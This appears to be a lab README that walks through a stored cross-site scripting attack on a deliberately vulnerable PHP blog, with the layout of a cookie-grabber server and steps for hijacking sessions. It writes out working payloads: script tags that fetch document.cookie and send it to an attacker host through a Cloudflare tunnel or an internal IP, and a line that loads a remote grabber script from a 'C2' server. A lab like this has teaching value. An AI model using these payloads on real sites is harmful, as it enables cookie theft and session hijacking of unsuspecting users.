<h1>Cross-Site Scripting (XSS) - Lab</h1>

Build the following lab to demonstrate a stored XSS-Attack:

- VM 1, LAMP-Stack with blog-platform (vulnerable blog)
- VM/Host for Cookie Stealing (see cookie stealer or flask grabber)
- Enable web-facing session hijacking with cloudflare tunnel (see how-to)

![XSS_Hosts](https://github.com/user-attachments/assets/d3e3f1ab-3312-47fa-bf03-6a66117756c3)

<b>Vulnerable target's file structure:</b>

<pre>
htm/
└── blog/
    ├── authenticate.php    --> check credentials
    ├── index.php           --> home page, requires login
    ├── login.html          --> Login-Page to POST credentials
    ├── posts.json          --> Database for Blogposts
    ├── save_post.php       --> writes a blogpost into posts.json 
    └── styles.css          --> CSS
</pre>
 
<b>Attacker's Apache-Server file structure:</b>
<pre>
html/
├── Cookies.txt           --> cookie-database with timestamps 
├── grabber.js            --> Receives cookie after XSS-execution and forwards it to saver.php
└── saver.php             --> Generates timestamp, saves cookie to txt-File
</pre>


Alternative attacker server:
Flask server to save cookies temporarely (see flask_cookie_grabber.py).

<h2>Stealing the cookie</h2>
In order to transmit the cookie to the attacker's server, you need to create a payload via stored XSS. It's task is to execute a remote script, which then receives the cookie.
<img width="1395" height="735" alt="image" src="https://github.com/user-attachments/assets/d6a4f818-cfed-4f31-a270-ed72e7d12223" />

<ol>
  <li>Open the blog website. Insert XSS into the vulnerable text box. Start stealer-server</li>
  <li>Post the XSS-code</li>
  <li>As soon as victim authenticates and blog entries are loaded, the script is executed in it's browser, loading the remote cookie stealer</li>
  <li>Cookie stealer saves the cookie and adds a timestamp. The session can be hijacked, as lang as it is established</li>
</ol>

<h3>Over web with Flask + https:</h3>
<script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>

<h3>Within the Network with Flask:</h3>
<script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script>
<br>
<br>
Example: <br>
<script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script>

<h3>Within the network with apache "C2"-Server:</h3>
<script src="http://[IP]/cookiegrabber/grabber.js"></script>



